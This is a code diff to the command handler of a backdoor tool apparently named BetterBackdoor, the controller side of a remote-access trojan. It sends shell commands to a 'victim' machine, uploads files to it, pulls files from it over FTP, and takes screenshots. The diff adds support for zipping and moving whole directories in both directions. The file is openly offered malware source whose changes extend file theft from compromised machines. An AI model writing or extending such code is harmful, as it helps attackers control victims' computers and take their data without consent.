@@ -4,6 +4,9 @@ import java.io.File;
 import java.io.IOException;
 import com.thatcherdev.betterbackdoor.BetterBackdoor;
 import com.thatcherdev.betterbackdoor.backend.FTP;
+import com.thatcherdev.betterbackdoor.backend.Utils;
+
+import org.apache.commons.io.FileUtils;
 
 public class HandleCommand {
 
@@ -54,19 +57,49 @@ public class HandleCommand {
 		} else if (command.equals("filesend")) {
 			System.out.println("Enter local filepath of file to send:");
 			String fileSend = BetterBackdoor.getInput("file");
-			System.out.println("Enter victim's filepath of file to receive:");
-			String fileRec = BetterBackdoor.getInput("");
-			Shell.out.println("filesend " + fileRec);
-			FTP.shell(fileSend, "send");
-			System.out.println(getResp());
+
+			File file = new File(fileSend);
+			if (file.isFile())
+				System.out.println("Enter victim's filepath of file to receive:");
+			else if (file.isDirectory()) {
+				System.out.println("You entered a directory. It will be compressed and then sent.");
+				System.out.println("Enter victim's filepath of ZIP file to receive:");
+			} else
+				System.out.println("No such file or directory");
+
+			if (file.exists()) {
+				String fileRec = BetterBackdoor.getInput("");
+				Shell.out.println("filesend " + fileRec);
+				if (file.isDirectory()) {
+					Utils.zipDir(file.getAbsolutePath());
+					FTP.shell(file.getAbsolutePath() + ".zip", "send");
+				} else {
+					FTP.shell(file.getAbsolutePath(), "send");
+				}
+				System.out.println(getResp());
+				if (file.isDirectory())
+					FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
+			}
 		} else if (command.equals("filerec")) {
 			System.out.println("Enter victim's filepath of file to send:");
 			String fileSend = BetterBackdoor.getInput("");
-			System.out.println("Enter local filepath of file to receive:");
-			String fileRec = BetterBackdoor.getInput("");
-			Shell.out.println("filerec " + fileSend);
-			FTP.shell(fileRec, "rec");
-			System.out.println(getResp());
+
+			Shell.out.println("filetype " + fileSend);
+			String filetype = getResp();
+			if (filetype.equals("file"))
+				System.out.println("Enter local filepath of file to receive:");
+			else if (filetype.equals("directory")) {
+				System.out.println("You entered a directory. It will be compressed and then received.");
+				System.out.println("Enter local filepath of ZIP file to receive:");
+			} else
+				System.out.println("No such file or directory");
+
+			if (!filetype.equals("not real")) {
+				String fileRec = BetterBackdoor.getInput("");
+				Shell.out.println("filerec " + fileSend);
+				FTP.shell(fileRec, "rec");
+				System.out.println(getResp());
+			}
 		} else if (command.equals("ss")) {
 			Shell.out.println("ss");
 			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
@@ -87,9 +120,7 @@ public class HandleCommand {
 			System.out.println(getResp());
 		} else if (command.equals("exit"))
 			System.exit(0);
-		else
-
-		{
+		else {
 			Shell.out.println(command);
 			System.out.println(getResp());
 		}
